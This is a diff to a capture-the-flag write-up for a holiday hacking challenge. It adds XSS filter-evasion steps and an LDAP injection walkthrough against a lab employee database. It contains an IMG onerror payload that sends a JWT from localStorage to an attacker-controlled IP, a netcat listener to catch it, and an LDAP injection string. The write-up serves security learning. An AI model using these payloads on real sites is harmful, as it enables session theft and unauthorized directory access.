@@ -60,13 +60,60 @@ reindeer, and then steal their {{{abbr(JSON Web Token, JWT)}}} credential and ac
 
 ** Cross-Site Scripting
 
-The first stage of this attack is our malicious {{{abbr(Cross-site Scripting, XSS)}}} request. First, we tried to steal the cookie, but in reviewing the code at http://edb.northpolechristmastown.com, we noticed that we needed to steal the token out of local storage:
+We begin by focusing on the support form. {{{abbr(Cross-site Scripting, XSS)}}} was heavily hinted at, so let's try a simple payload:
+
+#+CAPTION: Simple XSS Test
+#+attr_html: :width 350px
+[[./images/alert_test.png]]
+
+Then we see this pop up:
+
+#+CAPTION: Busted on XSS
+#+attr_html: :width 250px
+[[./images/alert_hacker.png]]
+
+Busted! Poking around in the source code a bit, we find this snippet in http://edb.northpolechristmastown.com/js/custom.js:
+
+#+BEGIN_SRC js
+  if (help_message.match(/[sS][cC][rR][iI][pP][tT]/g) == null) {
+      $.post( "/service", { uid: help_uid, email: help_email, message: help_message }).done(function( result ) {
+	  Materialize.toast('Submitting... Please Wait.', 4000);
+	  if (result.bool) {
+	      Materialize.toast(result.message, 4000);
+	      setTimeout(function(){
+		  window.location.href = result.link;
+	      }, 1000);
+	  } else {
+	      Materialize.toast(result.message, 4000);
+	  }
+      }).fail(function(error) {
+	  Materialize.toast('Error: '+error.status + " " + error.statusText, 4000);
+      })
+  } else {
+      Materialize.toast('Alert, Hacker!', 4000);
+#+END_SRC
+
+Reviewing the [[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet][OWASP Cheat Sheet]] mentioned in the blog post, we can find several options that don't need a =<script>= tag. For example:
+
+#+BEGIN_SRC html
+<IMG SRC=/ onerror="document.location='http://sans.edu'"></IMG>
+#+END_SRC
+
+Upon submitting the form, we can view our support request:
+
+#+CAPTION: Our Support Request with a Broken Image
+#+attr_html: :width 500px
+[[./images/xss_success.png]]
+
+Once the image doesn't load, we're redirected to the SANS site. Great!
+
+First, we tried to steal the cookie, but in reviewing the code at http://edb.northpolechristmastown.com, we noticed that we needed to steal the token out of local storage:
 
 #+BEGIN_SRC js
 token = localStorage.getItem("np-auth");
 #+END_SRC
 
-A classic {{{abbr(Cross-site Scripting, XSS)}}} attack is using the HTML =IMG= tag, and causing Javascript code to run and leak the token to a server we control. This is just one of many options in the [[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet][OWASP Cheat Sheet]].
+A classic {{{abbr(Cross-site Scripting, XSS)}}} attack is to leak the token to a server we control. We'll modify our malicious image to:
 
 #+BEGIN_SRC html
 <IMG SRC=/ onerror="document.location='http://10.142.0.11:4444/?cookie='+localStorage.getItem('np-auth');">
@@ -74,9 +121,6 @@ A classic {{{abbr(Cross-site Scripting, XSS)}}} attack is using the HTML =IMG= t
 #+END_SRC
 
 We'll start a =netcat= listener on the l2s system:
-
-
-on l2s:
 
 #+BEGIN_SRC
 $ nc -v -l -p 4444
@@ -201,10 +245,73 @@ We managed to login to the system, but now let's see what LDAP injection we can 
 #+CAPTION: EDB Search for Elves
 [[./images/edb_test_search.png]]
 
-Why, this looks pretty similar to what the blog post has. On a lark, let's see what happens if we try searching for the LDAP injection example from the blog post:
+Why, this looks pretty similar to what the blog post has. Poking around in the source code a little bit, we can see that when we login to the system, and load =/home=, we get the following snippet in the response:
+
+#+BEGIN_SRC html
+//Note: remember to remove comments about backend query before going into north pole production network
+/*
+
+isElf = 'elf'
+if request.form['isElf'] != 'True':
+    isElf = 'reindeer'
+attribute_list = [x.encode('UTF8') for x in request.form['attributes'].split(',')]
+result = ldap_query('(|(&(gn=*'+request.form['name']+'*)(ou='+isElf+'))(&(sn=*'+request.form['name']+'*)(ou='+isElf+')))', attribute_list)
+
+#request.form is the dictionary containing post params sent by client-side
+#We only want to allow query elf/reindeer data
+
+*/
+#+END_SRC
+
+The LDAP query is a bit hard to parse, so let's take a closer look:
 
 #+BEGIN_SRC 
-))(department=it)(|(cn=
+( 
+    | # OR-ed clauses
+    (
+        & # AND-ed clauses
+       ( gn=*' + request.form['name'] + '* )
+       ( ou='+isElf+' )
+    ) # What the first query looks for is the name matching any part of the gn field, AND the ou field matching isElf.
+    (
+        &
+        (sn=*'+request.form['name']+'*)
+        (ou='+isElf+')
+    ) # The second query is very similar, but matches the name against sn instead of gn.
+)
+#+END_SRC
+
+Some LDAP pseudocode might be:
+
+#+BEGIN_SRC 
+( ( gn=*$name* ) && (ou=$isElf) ) || ( (sn=*$name*) && (ou=$isElf) )
+#+END_SRC
+
+Since we're providing the name field, and it's not being validated, this is a prime target for LDAP injection. We'll try rewriting this as:
+
+#+BEGIN_SRC 
+( gn=* ) || ( ( cn=* ) || (ou=$isElf) ) || ( (sn=*$name*) && (ou=$isElf) )
+#+END_SRC
+
+Converting this back into an actual LDAP query, our first subquery would be:
+
+#+BEGIN_SRC 
+(
+    &
+   ( gn=* )
+)
+
+(
+    |
+    ( cn='* )
+    ( ou='+isElf+' )
+)
+#+END_SRC
+
+To get our query formatted that way, our name would be:
+
+#+BEGIN_SRC 
+))(|(cn=
 #+END_SRC
 
 #+CAPTION: EDB Injection PoC
